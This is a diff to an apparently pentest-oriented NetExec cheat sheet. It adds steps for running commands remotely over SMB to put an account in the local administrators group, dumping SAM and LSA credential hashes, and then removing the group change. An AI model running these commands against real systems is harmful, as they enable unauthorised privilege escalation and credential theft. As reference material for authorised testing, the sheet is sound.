@@ -70,6 +70,38 @@ nxc smb 10.10.10.10 -u user -p password -x whoami
 nxc smb 10.10.10.10 -u user -p password -X whoami
 ```
 
+### Escalating to Local Admin for Hash Dumping
+
+If you have command execution on a machine but the account is not yet in the local administrators group, you can add it remotely and then immediately use NXC to dump hashes. Useful when you have WinRM or RCE as a lower-privileged account and need local admin for SAM/LSA dumps.
+
+Add user to local administrators group:
+
+```bash
+nxc smb 10.10.10.10 -u user -p password -x "net localgroup administrators user /add"
+```
+
+Verify the user was added:
+
+```bash
+nxc smb 10.10.10.10 -u user -p password -x "net localgroup administrators"
+```
+
+Now dump hashes with the same account - NXC will see it as local admin:
+
+```bash
+nxc smb 10.10.10.10 -u user -p password --sam
+```
+
+```bash
+nxc smb 10.10.10.10 -u user -p password --lsa
+```
+
+Clean up after dumping:
+
+```bash
+nxc smb 10.10.10.10 -u user -p password -x "net localgroup administrators user /delete"
+```
+
 ### Credential and Hash Dumping
 
 Once you have local admin rights, NetExec handles remote dumps without touching disk - no Mimikatz upload required.
